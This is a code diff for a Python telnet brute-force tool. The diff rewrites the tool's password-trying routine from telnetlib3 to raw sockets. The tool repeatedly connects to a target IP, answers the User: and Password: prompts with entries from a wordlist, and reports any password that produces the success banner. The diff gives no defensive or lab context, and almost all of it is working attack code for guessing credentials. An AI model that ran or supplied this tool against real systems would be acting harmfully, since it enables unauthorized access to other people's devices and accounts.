@@ -1,13 +1,12 @@
 #!/usr/bin/env python3
-# Telnet Brute Force (using telnetlib3) - Fixed for limited servers
+# Telnet Brute Force
 
 import argparse
-import asyncio
-import telnetlib3
+import socket
 import sys
+import signal
 import time
 import threading
-import signal
 
 RED = "\033[38;2;255;0;0m"
 RESET = "\033[0m"
@@ -26,45 +25,16 @@ def UpdateTimer(startTime):
         elapsed = time.time() - startTime
         elapsedFmt = time.strftime("%H:%M:%S", time.gmtime(elapsed))
         with stdoutLock:
+            # clear and rewrite the progress line
             sys.stdout.write("\r\033[K" + progressLine + "\n")
+            # write duration on the next line (no clearing)
             sys.stdout.write(f"Duration: {BOLD}{elapsedFmt}{RESET}")
+            # move cursor back up so next progress update overwrites correctly
             sys.stdout.write("\033[F")
             sys.stdout.flush()
         time.sleep(1)
 
-# 🧰 Custom protocol class to ignore WILL TTYPE, WILL LINEMODE, etc.
-class SafeTelnetClient(telnetlib3.BaseClient):
-    def handle_will(self, opt):
-        try:
-            super().handle_will(opt)
-        except ValueError:
-            pass  # Ignore unsupported options
-
-async def TryPassword(host, port, username, password, successBanner):
-    try:
-        reader, writer = await telnetlib3.open_connection(
-            host,
-            port=port,
-            shell=None,
-            connect_minwait=0.1,
-            connect_maxwait=1.0,
-            protocol_factory=lambda: SafeTelnetClient()
-        )
-
-        await reader.readuntil("User:")
-        writer.write(username + "\r\n")
-
-        await reader.readuntil("Password:")
-        writer.write(password + "\r\n")
-
-        await asyncio.sleep(0.4)
-        output = await reader.read(2048)
-        writer.close()
-        return successBanner in output
-    except Exception:
-        return False
-
-async def TelnetBruteForce(host, port, username, passwords):
+def TelnetBruteForce(host, port, username, passwords):
     global stopTimer, progressLine, timerThread
 
     successBanner = SUCCESS_BANNER_TEMPLATE.format(username)
@@ -86,7 +56,7 @@ async def TelnetBruteForce(host, port, username, passwords):
             sys.stdout.write("\r\033[K" + progressLine)
             sys.stdout.flush()
 
-        if await TryPassword(host, port, username, pwd, successBanner):
+        if TryPassword(host, port, username, pwd, successBanner):
             print(f"\n\n{RED}[+] SUCCESS:{RESET} \n{RED}Username: {RESET}{BOLD}{username}{RESET}\n{RED}Password: {RESET}{BOLD}{pwd}{RESET}")
             stopTimer = True
             timerThread.join()
@@ -95,6 +65,51 @@ async def TelnetBruteForce(host, port, username, passwords):
     stopTimer = True
     timerThread.join()
     print(f"\n\n{RED}[-] No valid password found.{RESET}")
+
+def TryPassword(host, port, username, password, successBanner):
+    try:
+        # Create socket and connect to target
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(5)
+        sock.connect((host, port))
+
+        # Read until we get 'User:' prompt (Telnet)
+        sock.send(b"\r\n")  # Send an initial newline to get the prompt
+        time.sleep(0.2)  # Wait for the prompt to come back
+        data = sock.recv(1024).decode(errors="ignore")  # Decode bytes to string
+
+        if "User:" not in data:
+            sock.close()
+            return False
+
+        # Send username
+        sock.send((username + "\r\n").encode())
+        time.sleep(0.2)  # Give some time for the prompt to come back
+
+        # Expecting password prompt
+        data = sock.recv(1024).decode(errors="ignore")  # Decode bytes to string
+        if "Password:" not in data:
+            sock.close()
+            return False
+
+        # Send password
+        sock.send((password + "\r\n").encode())
+        time.sleep(0.2)
+
+        # Get the output after sending the password
+        output = sock.recv(1024).decode(errors="ignore")  # Decode bytes to string
+        sock.close()
+
+        # Check if success banner is in output
+        return successBanner in output
+    except Exception as e:
+        print(f"[!] Error: {e}")
+        return False
+    finally:
+        try:
+            sock.close()
+        except:
+            pass
 
 def LoadPasswords(path):
     try:
@@ -109,17 +124,22 @@ def menu():
     username = input(f"{RED}Username: {RESET}").strip()
     wordlist = input(f"{RED}Wordlist [default: passwords.txt]: {RESET}").strip() or "passwords.txt"
     passwords = LoadPasswords(wordlist)
-    asyncio.run(TelnetBruteForce(host, DEFAULT_PORT, username, passwords))
+    TelnetBruteForce(host, DEFAULT_PORT, username, passwords)
 
 def terminal():
-    parser = argparse.ArgumentParser(description="Telnet Brute Force Tool (telnetlib3 safe)")
+    parser = argparse.ArgumentParser(
+        description="Telnet Brute Force Tool",
+        formatter_class=argparse.RawTextHelpFormatter
+    )
     parser.add_argument("-t", "--target", required=True, help="Target IP address")
     parser.add_argument("-u", "--username", required=True, help="Username to brute")
-    parser.add_argument("-w", "--wordlist", default="passwords.txt", help="Wordlist path")
-    parser.add_argument("-p", "--port", type=int, default=DEFAULT_PORT, help="Telnet port")
+    parser.add_argument("-w", "--wordlist", default="passwords.txt",
+                        help="Path to wordlist (default: passwords.txt)")
+    parser.add_argument("-p", "--port", type=int, default=DEFAULT_PORT,
+                        help=f"Telnet port (default: {DEFAULT_PORT})")
     args = parser.parse_args()
     passwords = LoadPasswords(args.wordlist)
-    asyncio.run(TelnetBruteForce(args.target, args.port, args.username, passwords))
+    TelnetBruteForce(args.target, args.port, args.username, passwords)
 
 def SignalHandler(sig, frame):
     global stopTimer, timerThread
